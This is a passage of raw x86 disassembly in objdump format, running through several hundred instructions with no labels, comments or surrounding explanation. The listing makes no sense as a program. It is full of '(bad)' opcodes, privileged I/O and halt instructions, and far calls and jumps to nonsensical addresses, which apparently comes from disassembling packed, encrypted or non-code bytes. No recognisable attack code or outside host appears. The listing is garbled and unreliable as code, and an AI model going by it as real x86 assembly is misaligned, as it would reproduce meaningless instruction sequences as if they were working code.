  419d46:	mov    ch,0x8b
  419d48:	lahf   
  419d49:	pop    esi
  419d4a:	mov    bl,BYTE PTR [ecx]
  419d4c:	inc    esp
  419d4d:	mov    bl,BYTE PTR [ebx]
  419d4f:	sar    eax,cl
  419d51:	mov    esp,0x37f1d6eb
  419d56:	or     BYTE PTR [esi+0x3a64ad6c],dh
  419d5c:	sub    eax,esp
  419d5e:	add    edi,esp
  419d60:	pop    DWORD PTR [ebx+0x67683f5a]
  419d66:	in     eax,dx
  419d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d68:	mov    eax,0x4805f6da
  419d6d:	out    dx,eax
  419d6e:	mov    ds:0x3f1c9753,eax
  419d73:	mov    al,ds:0x33e04dd3
  419d78:	inc    esp
  419d79:	mov    eax,ds:0xb81bf21e
  419d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d7f:	std    
  419d80:	pop    ecx
  419d81:	lods   eax,DWORD PTR ds:[esi]
  419d82:	adc    esp,eax
  419d84:	push   ecx
  419d85:	enter  0x1c4e,0xd9
  419d89:	dec    esi
  419d8a:	ficom  WORD PTR [edx-0x60]
  419d8d:	fldenv [ebx+ebp*4-0x2a2a5a02]
  419d94:	jle    0x419dcb
  419d96:	out    dx,eax
  419d97:	cli    
  419d98:	mov    DWORD PTR [edx+0x31],esi
  419d9b:	ins    BYTE PTR es:[edi],dx
  419d9c:	mov    ebp,ecx
  419d9e:	mov    cs,edi
  419da0:	sub    cl,BYTE PTR [edx]
  419da2:	(bad)  
  419da3:	iret   
  419da4:	lgs    eax,FWORD PTR [ecx]
  419da7:	faddp  st(6),st
  419da9:	rol    DWORD PTR [edi-0x21],cl
  419dac:	ss jle 0x419d92
  419daf:	jne    0x419d5c
  419db1:	hlt    
  419db2:	dec    ecx
  419db3:	shr    DWORD PTR [esi],0x6d
  419db6:	test   DWORD PTR [esi],edi
  419db8:	pop    edx
  419db9:	mov    ds:0x48fae2f4,eax
  419dbe:	loope  0x419de3
  419dc0:	xchg   ebx,eax
  419dc1:	lock addr16 (bad) 
  419dc4:	sub    al,BYTE PTR [ecx-0x12]
  419dc7:	xchg   ebp,eax
  419dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dc9:	fs pop ds
  419dcb:	cmp    BYTE PTR [esi],cl
  419dcd:	mov    BYTE PTR [edi],bh
  419dcf:	call   0x6411:0x9d78386
  419dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dd7:	xchg   DWORD PTR [esi-0x1a],esi
  419dda:	rcr    BYTE PTR [edi],cl
  419ddc:	aas    
  419ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dde:	in     eax,dx
  419ddf:	and    DWORD PTR [ecx+0x210df4fe],0xffffffd2
  419de6:	rcl    BYTE PTR [esi],1
  419de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419de9:	mov    al,0xcc
  419deb:	test   al,0x3d
  419ded:	jbe    0x419dd4
  419def:	mov    ds:0x5ada4711,al
  419df4:	xor    esp,DWORD PTR [edx-0x1a]
  419df7:	(bad)  
  419df8:	mov    al,0x2a
  419dfa:	int3   
  419dfb:	test   DWORD PTR [edx+0x4b7e20b8],edi
  419e01:	fisub  WORD PTR [eax]
  419e03:	mov    WORD PTR [ebp+0x7a],?
  419e06:	sahf   
  419e07:	lea    edi,[edi+ebp*2-0x6bf3cd49]
  419e0e:	add    DWORD PTR [ebx-0x77],0xffffffaf
  419e12:	jnp    0x419e43
  419e14:	cmp    eax,ecx
  419e16:	sub    bh,BYTE PTR [esi+edx*8+0x1bb608aa]
  419e1d:	out    dx,al
  419e1e:	add    eax,0x981d49d
  419e23:	pusha  
  419e24:	dec    ecx
  419e25:	push   DWORD PTR [ebx+0x21750c05]
  419e2b:	iret   
  419e2c:	cmc    
  419e2d:	hlt    
  419e2e:	cli    
  419e2f:	mov    bh,0x91
  419e31:	jmp    0x2e0317f3
  419e36:	mov    al,ds:0xd7e7c42c
  419e3b:	jns    0x419e09
  419e3d:	out    0x52,eax
  419e3f:	mov    ds:0xe4d4921f,al
  419e44:	into   
  419e45:	fild   WORD PTR [eax]
  419e47:	pop    ebp
  419e48:	in     eax,0xb5
  419e4a:	shl    DWORD PTR [eax+0x5c],1
  419e4d:	cmp    ah,BYTE PTR [ebp+ecx*2-0x79]
  419e51:	xlat   BYTE PTR ds:[ebx]
  419e52:	xor    al,0x5b
  419e54:	mov    ds:0x1510ad5e,al
  419e59:	in     eax,dx
  419e5a:	add    eax,0x9673e509
  419e5f:	sub    ah,BYTE PTR [ecx+0x2a]
  419e62:	adc    al,0xcb
  419e64:	adc    al,0x1e
  419e66:	xchg   ebx,eax
  419e67:	sbb    eax,0x1711992c
  419e6c:	and    DWORD PTR [ebx],esp
  419e6e:	retf   
  419e6f:	pusha  
  419e70:	xchg   ecx,eax
  419e71:	fisttp WORD PTR [ecx-0x38]
  419e74:	sar    edx,0x88
  419e77:	gs sbb eax,0x4551c29
  419e7d:	dec    ebx
  419e7e:	out    dx,eax
  419e7f:	add    BYTE PTR [ecx],dl
  419e81:	jle    0x419e56
  419e83:	xor    ebp,ebx
  419e85:	xchg   ebx,eax
  419e86:	mov    eax,ds:0xd5da2ee5
  419e8b:	mov    BYTE PTR [edi],bl
  419e8d:	ret    0x45f2
  419e90:	mov    dl,0xbc
  419e92:	sub    ah,al
  419e94:	jne    0x419ed5
  419e96:	lock lods eax,DWORD PTR ds:[esi]
  419e98:	mov    BYTE PTR [esi+0x24],dh
  419e9b:	out    0xd9,al
  419e9d:	mov    dl,0x2d
  419e9f:	imul   ebp,edi,0x1
  419ea2:	scas   eax,DWORD PTR es:[edi]
  419ea3:	(bad)  
  419ea4:	fnstenv [ebx]
  419ea6:	xor    eax,0x6055dc91
  419eab:	cmp    bh,bh
  419ead:	call   0xfcb2cad3
  419eb2:	jno    0x419ea3
  419eb4:	xlat   BYTE PTR ds:[ebx]
  419eb5:	push   eax
  419eb6:	out    0xf9,al
  419eb8:	jnp    0x419e47
  419eba:	inc    ebx
  419ebb:	mov    al,ah
  419ebd:	call   0x7e4bd41a
  419ec2:	mov    ds:0xca604089,eax
  419ec7:	xor    al,BYTE PTR [esi+0x72]
  419eca:	mov    cl,0xdf
  419ecc:	popf   
  419ecd:	fiadd  WORD PTR [esi]
  419ecf:	jns    0x419f01
  419ed1:	mov    ds:0x43fbadc2,al
  419ed6:	ret    0x599
  419ed9:	icebp  
  419eda:	aaa    
  419edb:	pop    ebp
  419edc:	out    0xd8,eax
  419ede:	mov    al,0xb5
  419ee0:	push   edx
  419ee1:	dec    eax
  419ee2:	retf   0x6bed
  419ee5:	cmp    BYTE PTR [esi-0x78],0x70
  419ee9:	jge    0x419e8d
  419eeb:	xchg   edx,eax
  419eec:	das    
  419eed:	jns    0x419eb1
  419eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ef0:	test   BYTE PTR [ebx+edx*4-0x57a311a8],ah
  419ef7:	retf   0x32e0
  419efa:	enter  0xaffa,0x83
  419efe:	jne    0x419f5e
  419f00:	popa   
  419f01:	ror    DWORD PTR [ebx+0x527b71f],0x54
  419f08:	mov    ah,0xa8
  419f0a:	sbb    edi,DWORD PTR [edi]
  419f0c:	dec    edi
  419f0d:	xchg   esi,esp
  419f0f:	fdiv   st,st(2)
  419f11:	and    esi,0x2c
  419f14:	or     al,0x33
  419f16:	fnsave [ebp+0x61cf5dc0]
  419f1c:	das    
  419f1d:	stc    
  419f1e:	mov    esi,eax
  419f20:	jmp    0x419ebb
  419f22:	dec    edx
  419f23:	retf   0x6c0f
  419f26:	push   0xffffffdf
  419f28:	dec    edi
  419f29:	adc    al,BYTE PTR [edx+0x77]
  419f2c:	sub    dh,dl
  419f2e:	inc    edx
  419f2f:	dec    ecx
  419f30:	je     0x419ed0
  419f32:	int    0x31
  419f34:	mov    eax,cs:0xc8489bd7
  419f3a:	retf   0x212f
  419f3d:	out    0xda,eax
  419f3f:	and    BYTE PTR [eax],0xaa
  419f42:	(bad)  
  419f44:	and    BYTE PTR [ebx-0x52],al
  419f47:	ror    DWORD PTR [esi],1
  419f49:	test   DWORD PTR [edx],ebp
  419f4b:	sbb    edx,DWORD PTR [ebx+0x502bff61]
  419f51:	push   0x65f35093
  419f56:	mov    BYTE PTR [eax+edi*2-0x63cc7dab],dh
  419f5d:	jl     0x419fbe
  419f5f:	or     ebx,DWORD PTR [edx-0x3025912b]
  419f65:	mov    eax,ds:0x99a4a55f
  419f6a:	ret    
  419f6b:	push   0xffffff94
  419f6d:	in     eax,dx
  419f6e:	in     eax,0x87
  419f70:	mov    ebp,0x298f8006
  419f75:	bound  eax,QWORD PTR [ebx+0xd]
  419f78:	or     al,0x94
  419f7a:	push   0x72e12c2b
  419f7f:	lods   al,BYTE PTR ds:[esi]
  419f80:	xlat   BYTE PTR ds:[ebx]
  419f81:	mov    ch,0xf3
  419f83:	aas    
  419f84:	imul   eax,DWORD PTR es:[edx-0x15d093cc],0x464b8127
  419f8f:	push   esi
  419f90:	pop    edx
  419f91:	pop    esi
  419f92:	pop    es
  419f93:	arpl   WORD PTR ds:0x3adc5818,sp
  419f99:	add    eax,0x1474c9eb
  419f9e:	popa   
  419f9f:	adc    al,0x9a
  419fa1:	sbb    eax,0x3048cddf
  419fa6:	das    
  419fa7:	iret   
  419fa8:	daa    
  419fa9:	ror    DWORD PTR cs:[ebx],1
  419fac:	data16 (bad) 
  419fae:	mov    edx,0x714ad73d
  419fb3:	lds    ecx,FWORD PTR [edx-0x3ec84f27]
  419fb9:	retf   0xa4c8
  419fbc:	test   BYTE PTR [esi+0x27],dl
  419fbf:	loope  0x419fae
  419fc1:	int3   
  419fc2:	sub    DWORD PTR [ecx+0x45],0x0
  419fc6:	les    edx,FWORD PTR [esi*8+0x23fc3466]
  419fcd:	mov    bh,0x15
  419fcf:	add    edx,ebp
  419fd1:	aaa    
  419fd2:	lods   eax,DWORD PTR ds:[esi]
  419fd3:	inc    eax
  419fd4:	pop    edx
  419fd5:	cmp    al,0xe1
  419fd7:	or     esp,ebx
  419fd9:	and    eax,0xbb1f437a
  419fde:	mov    edx,0x4b2c05db
  419fe3:	add    eax,0x2cd53203
  419fe8:	adc    al,0xda
  419fea:	out    0x3e,al
  419fec:	ja     0x419f7a
  419fee:	pop    ecx
  419fef:	aam    0x2a
  419ff1:	mov    bl,0x59
  419ff3:	xor    BYTE PTR [ebx],0x3
  419ff6:	cwde   
  419ff7:	retf   
  419ff8:	pop    es
  419ff9:	sub    al,0xd6
  419ffb:	pop    ecx
  419ffc:	out    0xa7,eax
  419ffe:	push   ds
  419fff:	dec    ebx
  41a000:	scas   al,BYTE PTR es:[edi]
  41a001:	mov    ds,WORD PTR [ebx-0x6b]
  41a004:	sub    bl,BYTE PTR ds:0xbafef47
  41a00a:	shl    DWORD PTR [edx-0x54],0x5b
  41a00e:	popa   
  41a00f:	adc    DWORD PTR [ecx+ebx*4-0x2dc75262],edx
  41a016:	mov    esi,DWORD PTR [edx+0x22]
  41a019:	add    eax,0x4169d004
  41a01e:	cmp    ch,0x40
  41a021:	pop    edi
  41a022:	sahf   
  41a023:	xor    cl,dl
  41a025:	push   0xffffffdc
  41a027:	xor    eax,0xaba7adc4
  41a02c:	push   ebp
  41a02d:	clc    
  41a02e:	pop    edx
  41a02f:	mov    esp,ecx
  41a031:	adc    dh,BYTE PTR [edi-0x5c404bb9]
  41a037:	cs dec edx
  41a039:	lds    edx,FWORD PTR [ebp-0x7b]
  41a03c:	arpl   WORD PTR [eax-0x7bd73102],bp
  41a042:	dec    ecx
  41a043:	and    ebp,ecx
  41a045:	cmp    eax,0x2fa762b3
  41a04a:	xchg   eax,ebx
  41a04c:	into   
  41a04d:	jns    0x41a08b
  41a04f:	inc    edi
  41a050:	or     esi,eax
  41a052:	and    DWORD PTR [esi+0x59f5226b],ebx
  41a058:	push   0x2a
  41a05a:	(bad)  
  41a05b:	ds hlt 
  41a05d:	cdq    
  41a05e:	icebp  
  41a05f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41a061:	rcl    BYTE PTR [eax],cl
  41a063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a064:	xchg   ebx,eax
  41a065:	inc    ecx
  41a066:	push   esp
  41a067:	imul   edi,DWORD PTR [ebp+0x669d7e61],0xffffff96
  41a06e:	or     BYTE PTR [edi+edx*1],0x19
  41a072:	enter  0xa6f3,0xfd
  41a076:	(bad)  
  41a077:	mov    ch,0x79
  41a079:	rcr    DWORD PTR [ecx+0x63314c10],1
  41a07f:	push   eax
  41a080:	add    eax,0x6c6bdf35
  41a085:	call   0x9abd:0xd43c4555
  41a08c:	cdq    
  41a08d:	mov    ebx,0xdcab2b84
  41a092:	shl    BYTE PTR [esi],0x4d
  41a095:	pusha  
  41a096:	adc    ebp,DWORD PTR [ecx-0x74649f0e]
  41a09c:	fst    QWORD PTR [ebp-0x50]
  41a09f:	sub    BYTE PTR [ecx],dl
  41a0a1:	arpl   WORD PTR [edx+ebx*1+0xc752db1],cx
  41a0a8:	pop    esp
  41a0a9:	(bad)  
  41a0aa:	mov    ds:0x7220870d,al
  41a0af:	int3   
  41a0b0:	jnp    0x41a06a
  41a0b2:	(bad)  
  41a0b3:	pop    esi
  41a0b4:	test   esp,ebx
  41a0b6:	mov    edx,0xfdf3a529
  41a0bb:	(bad)  
  41a0bc:	in     eax,dx
  41a0bd:	jmp    0x85d4:0x8aa4b319
  41a0c4:	sub    al,0x5c
  41a0c6:	or     bl,BYTE PTR [ecx]
  41a0c8:	js     0x41a0d5
  41a0ca:	lods   eax,DWORD PTR ds:[esi]
  41a0cb:	jbe    0x41a0cf
  41a0cd:	add    BYTE PTR [eax-0x38],ch
  41a0d0:	aaa    
  41a0d1:	jle    0x41a152
  41a0d3:	fisttp QWORD PTR [ecx+0x23]
  41a0d6:	int3   
  41a0d7:	ficom  WORD PTR [esp+edi*1+0x1dd4f1f4]
  41a0de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0df:	pop    ds
  41a0e0:	ret    
  41a0e1:	call   DWORD PTR [edx+0x32]
  41a0e4:	fmul   QWORD PTR [ebx-0x35]
  41a0e7:	xchg   edi,eax
  41a0e8:	sub    eax,0x99dd02ff
  41a0ed:	xchg   ebx,eax
  41a0ee:	cmp    edi,edx
  41a0f0:	mov    bl,0x27
  41a0f2:	call   DWORD PTR [edi+0x7e3a4716]
  41a0f8:	lods   al,BYTE PTR ds:[esi]
  41a0f9:	push   ds
  41a0fa:	int    0xa3
  41a0fc:	pushf  
  41a0fd:	mov    al,0x84
  41a0ff:	or     esp,DWORD PTR [edi+0x5a6b0083]
  41a105:	mov    eax,DWORD PTR [ebp-0x1501549c]
  41a10b:	das    
  41a10c:	fiadd  DWORD PTR [ecx+0x1d8b1224]
  41a112:	xchg   edi,eax
  41a113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a114:	xor    BYTE PTR [eax],bl
  41a116:	or     edx,DWORD PTR [ebx+0x3b8d3fca]
  41a11c:	or     al,0x75
  41a11e:	pop    esi
  41a11f:	jge    0x41a0d3
  41a121:	fcmove st,st(1)
  41a123:	aaa    
  41a124:	push   esi
  41a125:	int3   
  41a126:	inc    edi
  41a127:	daa    
  41a128:	inc    ebx
  41a129:	call   0x9e18af62
  41a12e:	xlat   BYTE PTR ds:[ebx]
  41a12f:	into   
  41a130:	mov    ebx,0x9dfef4b0
  41a135:	aaa    
  41a136:	push   ebp
  41a137:	dec    ecx
  41a138:	ja     0x41a186
  41a13a:	dec    edx
  41a13b:	ror    DWORD PTR [ecx-0x4d],0xea
  41a13f:	in     al,0xef
  41a141:	mov    ch,BYTE PTR ds:0x6087f8da
  41a147:	mov    edi,esp
  41a149:	mov    ds:0x91bf3dc8,al
  41a14e:	ror    DWORD PTR [eax],0xa5
  41a151:	ret    
  41a152:	xor    DWORD PTR [edx+eiz*2],esi
  41a155:	shr    DWORD PTR [esi],0x9c
  41a158:	ja     0x41a0e9
  41a15a:	fmul   DWORD PTR [edx-0x2]
  41a15d:	sahf   
  41a15e:	stc    
  41a15f:	pop    edi
  41a160:	sbb    BYTE PTR [ebx+0x4a],ch
  41a163:	stos   DWORD PTR es:[edi],eax
  41a164:	cmp    DWORD PTR [edx+0xed8d1c3],eax
  41a16a:	fst    QWORD PTR [esi+eiz*4]
  41a16d:	mov    ecx,0x1053d808
  41a172:	adc    BYTE PTR [eax+ebx*8],bl
  41a175:	push   ss
  41a176:	inc    ebx
  41a177:	out    dx,eax
  41a178:	ja     0x41a1e7
  41a17a:	inc    edi
  41a17b:	mov    ecx,0xc5ac7ac6
  41a180:	pusha  
  41a181:	lods   eax,DWORD PTR ds:[esi]
  41a182:	cdq    
  41a183:	icebp  
  41a184:	or     BYTE PTR [eax+0x7d22d24c],al
  41a18a:	test   BYTE PTR [edi],dh
  41a18c:	aad    0x40
  41a18e:	or     ebp,esi
  41a190:	out    0x2,al
  41a192:	outs   dx,DWORD PTR ds:[esi]
  41a193:	jo     0x41a17f
  41a195:	in     eax,dx
  41a196:	mov    ds:0xc368ebb2,al
  41a19b:	adc    eax,0xde7d69ed
  41a1a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1a1:	mov    dl,0x69
  41a1a3:	pop    edx
  41a1a4:	outs   dx,BYTE PTR ds:[esi]
  41a1a5:	sbb    BYTE PTR [ecx],bh
  41a1a7:	xchg   edi,eax
  41a1a8:	mov    esp,DWORD PTR [esi]
  41a1aa:	retf   0x723a
  41a1ad:	sub    eax,0xf437b952
  41a1b2:	inc    esi
  41a1b3:	rcr    BYTE PTR [edx+esi*2+0xc],0x68
  41a1b8:	test   eax,0x9768eea0
  41a1bd:	push   0xffffffbe
  41a1bf:	add    DWORD PTR [esi+0x13],esi
  41a1c2:	shl    ebx,0x72
  41a1c5:	sub    eax,0x5f437965
  41a1ca:	jp     0x41a160
  41a1cc:	pop    ecx
  41a1cd:	xchg   edi,eax
  41a1ce:	xchg   ecx,eax
  41a1cf:	inc    ebx
  41a1d0:	jmp    0x8a2606c5
  41a1d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1d6:	jns    0x41a236
  41a1d8:	inc    esp
  41a1d9:	add    DWORD PTR [edx+0x452efea4],esi
  41a1df:	pushf  
  41a1e0:	inc    al
  41a1e2:	imul   edi,DWORD PTR [ebp+0x6e],0x30284541
  41a1e9:	mov    ecx,ecx
  41a1eb:	out    dx,al
  41a1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1ed:	gs call 0xb96f063b
  41a1f3:	xchg   edx,eax
  41a1f4:	pushf  
  41a1f5:	sbb    eax,0xe07729d4
  41a1fa:	daa    
  41a1fb:	(bad)
  41a1fe:	stos   DWORD PTR es:[edi],eax
  41a1ff:	out    dx,al
  41a200:	mov    ebp,DWORD PTR [ebp+0x79]
  41a203:	ds mov edi,0xb7c6daa
  41a209:	retf   
  41a20a:	loopne 0x41a241
  41a20c:	jne    0x41a248
  41a20e:	aad    0x18
  41a210:	fild   WORD PTR [eax]
  41a212:	je     0x41a261
  41a214:	fwait
  41a215:	fs push esp
  41a217:	push   fs
  41a219:	into   
  41a21a:	mov    ah,0x99
  41a21c:	inc    ebp
  41a21d:	jb     0x41a1e2
  41a21f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a220:	js     0x41a1dd
  41a222:	jg     0x41a240
  41a224:	or     bh,dl
  41a226:	popf   
  41a227:	aam    0x36
  41a229:	fwait
  41a22a:	xor    dl,cl
  41a22c:	frstor [ecx+0x75]
  41a22f:	(bad)  
  41a230:	mov    esi,0x22eff34e
  41a235:	fmul   DWORD PTR [edi]
  41a237:	sub    DWORD PTR [edx+0x14faf9d3],ebx
  41a23d:	jo     0x41a281
  41a23f:	inc    ecx
  41a240:	mov    ebp,0xd10614a3
  41a245:	mov    esi,ebp
  41a247:	dec    ebp
  41a248:	ins    BYTE PTR es:[edi],dx
  41a249:	pop    ebx
  41a24a:	ins    DWORD PTR es:[edi],dx
  41a24b:	inc    ecx
  41a24c:	or     BYTE PTR [ecx-0x41],ah
  41a24f:	xchg   ecx,eax
  41a250:	pcmpeqb mm0,QWORD PTR [ebp+0x497519f7]
  41a257:	dec    ebp
  41a258:	scas   al,BYTE PTR es:[edi]
  41a259:	nop
  41a25a:	pushw  ds
  41a25c:	test   al,0x53
  41a25e:	retf   0x2c90
  41a261:	gs jmp 0x41a271
  41a264:	push   edi
  41a265:	dec    ebx
  41a266:	mov    ?,WORD PTR [ecx+0x7]
  41a269:	(bad)  
  41a26a:	xlat   BYTE PTR ds:[ebx]
  41a26b:	dec    esp
  41a26c:	and    DWORD PTR [ebx-0x2c],eax
  41a26f:	mov    esi,0x3e63efb1
  41a274:	sub    ecx,DWORD PTR [ebp-0x29]
  41a277:	out    dx,al
  41a278:	pop    esi
  41a279:	repz jmp 0x2afb:0xfda3a1db
  41a281:	fisub  DWORD PTR [edi-0x711b0403]
  41a287:	xchg   ebp,eax
  41a288:	dec    edx
  41a289:	mov    eax,0x65e0bce1
  41a28e:	das    
  41a28f:	sub    al,0x47
  41a291:	daa    
  41a292:	and    esp,edi
  41a294:	sub    dl,BYTE PTR [ecx-0x26]
  41a297:	inc    ebp
  41a298:	inc    edi
  41a299:	loopne 0x41a2f9
  41a29b:	rcr    ah,cl
  41a29d:	push   ebx
  41a29e:	push   ds
  41a29f:	push   0xffffff80
  41a2a1:	ret    0xe83a
  41a2a4:	es adc al,0x17
  41a2a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2a8:	or     eax,0x810e3837
  41a2ad:	mov    ecx,0x3fc2d548
  41a2b2:	icebp  
  41a2b3:	nop
  41a2b4:	or     BYTE PTR [esi-0x6216ddf8],0x48
  41a2bb:	rcr    dl,cl
  41a2bd:	in     al,0x2e
  41a2bf:	std    
  41a2c0:	sub    ecx,0xffffffbf
  41a2c3:	sbb    edi,0x3e
  41a2c6:	lock gs scas eax,DWORD PTR es:[edi]
  41a2c9:	inc    esi
  41a2ca:	stos   DWORD PTR es:[edi],eax
  41a2cb:	dec    eax
  41a2cc:	mov    ds:0xa7fdcb96,al
  41a2d1:	(bad)  
  41a2d2:	jo     0x41a309
  41a2d4:	lea    esi,[ecx+esi*2]
  41a2d7:	add    al,0xab
  41a2d9:	jo     0x41a28b
  41a2db:	push   esi
  41a2dc:	ja     0x41a2cb
  41a2de:	mov    WORD PTR [esi+0x4eefdecb],ss
  41a2e4:	sbb    eax,0x71d30598
  41a2e9:	enter  0x6ac,0x1a
  41a2ed:	lods   eax,DWORD PTR ds:[esi]
  41a2ee:	xor    al,0xb0
  41a2f0:	enter  0x265a,0x57
  41a2f4:	addr16 int3 
  41a2f6:	mov    dh,cl
  41a2f8:	and    al,BYTE PTR [eax-0x14]
  41a2fb:	int3   
  41a2fc:	les    eax,FWORD PTR [eax-0x79]
  41a2ff:	mov    ds:0x7845ded3,al
  41a304:	and    BYTE PTR [edx],cl
  41a306:	rol    BYTE PTR [ebp+0x70],1
  41a309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a30a:	jae    0x41a34b
  41a30c:	loop   0x41a311
  41a30e:	sbb    eax,0x4cb6e5e
  41a313:	rol    BYTE PTR [eax+0x7dab810],cl
  41a319:	xor    DWORD PTR [ebp-0x5d],ecx
  41a31c:	jp     0x41a311
  41a31e:	int3   
  41a31f:	push   eax
  41a320:	imul   ebx,DWORD PTR [ecx-0x32],0xffffff8a
  41a324:	and    ecx,esp
  41a326:	in     al,dx
  41a327:	out    dx,eax
  41a328:	or     al,0x32
  41a32a:	push   0x5e
  41a32c:	mov    ah,0x81
  41a32e:	shr    BYTE PTR [ebp+0x5a2c747e],0xca
  41a335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a336:	(bad)  
  41a337:	mov    al,ds:0x218b7968
  41a33c:	inc    esp
  41a33d:	xchg   BYTE PTR [edi],dh
  41a33f:	xchg   ecx,eax
  41a340:	ss xor eax,0x2a036785
  41a346:	xchg   edx,eax
  41a347:	es call 0x10f6daad
  41a34d:	dec    ebp
  41a34e:	inc    edx
  41a34f:	fwait
  41a350:	cli    
  41a351:	lods   al,BYTE PTR ds:[esi]
  41a352:	(bad)  
  41a353:	gs push eax
  41a355:	stc    
  41a356:	lods   al,BYTE PTR ds:[esi]
  41a357:	dec    ebp
  41a358:	xchg   edi,eax
  41a359:	mov    edx,0x72257432
  41a35e:	ds cs std 
  41a361:	mov    eax,ds:0x6ad97095
  41a366:	fwait
  41a367:	in     al,0x10
  41a369:	mov    ds:0x20a82896,eax
  41a36e:	sub    DWORD PTR [edx+0x4],esi
  41a371:	mov    dh,0x61
  41a373:	sub    al,0x2f
  41a375:	(bad)  
  41a376:	out    dx,al
  41a377:	(bad)  
  41a378:	push   edi
  41a379:	push   es
  41a37a:	test   al,0x9
  41a37c:	pop    ds
  41a37d:	add    ah,BYTE PTR [ebx-0x2b64997b]
  41a383:	iret   
  41a384:	jle    0x41a3b4
  41a386:	mov    eax,0xe8994228
  41a38b:	inc    esi
  41a38c:	xchg   ebp,eax
  41a38d:	cmc    
  41a38e:	xchg   edi,eax
  41a38f:	mov    al,ds:0x986631ca
  41a394:	dec    esi
  41a395:	jmp    0x7847070b
  41a39a:	int3   
  41a39b:	jmp    0x2446:0x313a9fec
  41a3a2:	inc    esi
  41a3a3:	lods   al,BYTE PTR ds:[esi]
  41a3a4:	in     al,dx
  41a3a5:	pop    ebx
  41a3a6:	aaa    
  41a3a7:	adc    al,0x98
  41a3a9:	fwait
  41a3aa:	(bad)  
  41a3ab:	mov    al,ds:0x3b3f49ba
  41a3b0:	fnsave [ecx+eiz*8]
  41a3b3:	lods   eax,DWORD PTR ds:[esi]
  41a3b4:	xlat   BYTE PTR ds:[ebx]
  41a3b5:	gs push cs
  41a3b7:	sub    ch,0x70
  41a3ba:	cmp    al,0x29
  41a3bc:	add    dh,ch
  41a3be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3bf:	call   0xbb4f:0xbf4a6150
  41a3c6:	sbb    BYTE PTR [eax-0x7c],0x6b
  41a3ca:	dec    esp
  41a3cb:	fwait
  41a3cc:	push   0x7f173b5b
  41a3d1:	inc    ecx
  41a3d2:	adc    BYTE PTR [ebx-0x49],0xd8
  41a3d6:	xchg   DWORD PTR [eax-0x19],edx
  41a3d9:	and    BYTE PTR [ebx+eax*2+0x406c18f0],ah
  41a3e0:	int    0xf9
  41a3e2:	lods   al,BYTE PTR ds:[esi]
  41a3e3:	mov    eax,ds:0xc0791614
  41a3e8:	adc    eax,0xc729dee8
  41a3ed:	mov    al,ds:0xf0072517
  41a3f2:	sub    dl,ch
  41a3f4:	dec    ebx
  41a3f5:	(bad)  
  41a3f6:	scas   eax,DWORD PTR es:[edi]
  41a3f7:	mov    ebp,0xb305c4c9
  41a3fc:	ja     0x41a3ad
  41a3fe:	mov    ah,0x5f
  41a400:	mov    ecx,edx
  41a402:	shr    BYTE PTR [edx+0x5e],0x1c
  41a406:	mov    ch,0x73
  41a408:	enter  0xf70a,0x9
  41a40c:	pushf  
  41a40d:	sbb    BYTE PTR [ecx+ebx*2+0x3ba0374b],al
  41a414:	pushf  
  41a415:	fidiv  DWORD PTR [ebp+0x1f1e9bcb]
  41a41b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a41c:	xchg   esi,eax
  41a41d:	dec    ecx
  41a41e:	cmp    cl,BYTE PTR [ebp+0x5]
  41a421:	popa   
  41a422:	adc    eax,0x90250968
  41a427:	lods   eax,DWORD PTR ds:[esi]
  41a428:	jnp    0x41a3be
  41a42a:	into   
  41a42b:	pop    ds
  41a42c:	stos   BYTE PTR es:[edi],al
  41a42d:	jnp    0x41a47b
  41a42f:	fs jns 0x41a3c1
  41a432:	mov    ebx,0xe7408932
  41a437:	cli    
  41a438:	aam    0x83
  41a43a:	popa   
  41a43b:	sub    bl,0x3c
  41a43e:	daa    
  41a43f:	push   eax
  41a440:	pop    ebp
  41a441:	mov    al,ds:0x350dfc97
  41a446:	ss int 0xbc
  41a449:	xor    al,0xd3
  41a44b:	and    bh,BYTE PTR [edx+0x2cf4a04a]
  41a451:	jle    0x41a49a
  41a453:	add    bl,BYTE PTR [edx+0x2dc99db3]
  41a459:	rep outs dx,BYTE PTR ds:[esi]
  41a45b:	mov    ah,0xa0
  41a45d:	or     eax,0x4a74a005
  41a462:	and    esp,DWORD PTR [ebp+eiz*2-0xa]
  41a466:	push   0x3d3fb16a
  41a46b:	test   cl,al
  41a46d:	(bad)  
  41a46e:	jl     0x41a47a
  41a470:	jmp    0x1ddb:0xc6c00d5b
  41a477:	mov    ebp,0x875943bd
  41a47c:	push   ebx
  41a47d:	test   BYTE PTR [edi],al
  41a47f:	mov    bh,0x9
  41a481:	mov    ebx,0x4fd37b07
  41a486:	test   eax,0x863a2928
  41a48b:	mov    cs:0x73d66d64,eax
  41a491:	into   
  41a492:	das    
  41a493:	and    BYTE PTR [eax-0x2bfd4618],bl
  41a499:	in     eax,0x8e
  41a49b:	mov    dl,0xf5
  41a49d:	lds    eax,FWORD PTR [eax+0x356ffbc8]
  41a4a3:	add    BYTE PTR [ecx],bh
  41a4a5:	dec    edi
  41a4a6:	enter  0x4dcd,0x36
  41a4aa:	sbb    DWORD PTR [ecx],esi
  41a4ac:	push   ds
  41a4ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4ae:	mov    DWORD PTR [edi+ebx*8-0x3b],eax
  41a4b2:	bnd jbe 0x41a501
  41a4b5:	clc    
